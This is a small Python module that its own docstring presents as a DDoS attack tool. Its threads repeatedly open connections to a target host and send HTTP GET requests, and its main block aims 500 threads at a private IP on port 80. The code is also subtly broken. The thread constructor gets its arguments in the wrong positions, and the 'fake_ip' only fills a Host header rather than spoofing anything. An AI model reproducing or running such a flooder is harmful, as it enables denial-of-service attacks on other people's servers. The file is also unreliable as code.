"""This module provides `DDoS` attack functionalities.

------------

Exports
------------

    - :py:func:`ddos.attack` is main/entry function

-------------------------------

Related documentations/articles
-------------------------------

    - socket module: https://docs.python.org/3/library/socket.html
    - threading module: https://docs.python.org/3/library/threading.html
    - python style guide: https://www.python.org/dev/peps/pep-0008
    - python docstring conventions: https://www.python.org/dev/peps/pep-0257
    - documenting python devguide: https://devguide.python.org/documenting
    - reStructuredText docstring format: https://www.python.org/dev/peps/pep-0287
    - reStructuredText doc: https://docutils.sourceforge.io/rst.html
"""

import socket
import threading


_attack_num = 0


def _attack(target_ip: str, fake_ip: str, port: int):
    """Makes multiple attacks on a target.

    :param target_ip: target ip
    :type target_ip: str
    :param fake_ip: fake ip (must be a valid ip)
    :type fake_ip: str
    :param port: port number
    :type port: int
    """
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, port))
        s.sendto(("GET /" + target_ip + " HTTP/1.1\r\n").encode('ascii'), (target_ip, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target_ip, port))

        global _attack_num
        _attack_num += 1
        print(_attack_num)

        s.close()


def attack(number_of_attacks: int, target_ip: str, fake_ip: str, port: int):
    """Makes multiple attacks on multiple targets asynchronously.

    :param number_of_attacks: [description]
    :type number_of_attacks: int
    :param target_ip: target ip
    :type target_ip: str
    :param fake_ip: fake ip (must be a valid ip)
    :type fake_ip: str
    :param port: port number
    :type port: int
    """
    for _ in range(number_of_attacks):
        thread = threading.Thread(target_ip, fake_ip, port, target=_attack)
        thread.start()


if __name__ == '__main__':
    attack(
        number_of_attacks=500,
        target_ip='10.0.0.138',
        fake_ip='182.21.20.32',
        port=80
    )
